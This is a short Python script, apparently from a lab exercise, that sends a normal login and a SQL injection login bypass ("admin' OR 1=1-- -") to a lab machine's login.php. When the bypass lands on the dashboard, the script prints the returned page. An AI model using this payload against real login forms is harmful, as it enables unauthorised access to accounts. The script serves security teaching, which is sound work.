"""Compara um login normal e uma entrada de SQLi na aplicação do dia 4."""

import argparse

import requests


parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--ip', required=True, help='IP da Lab Machine')
args = parser.parse_args()

url = f'http://{args.ip}:5000/login.php'
for rotulo, usuario, senha in (
    ('controle', 'admin', 'admin'),
    ('teste', "admin' OR 1=1-- -", 'x'),
):
    resposta = requests.post(
        url, data={'username': usuario, 'password': senha}, timeout=10
    )
    print(f'{rotulo}: HTTP {resposta.status_code} -> {resposta.url}')
    if 'dashboard.php' in resposta.url:
        print(resposta.text)
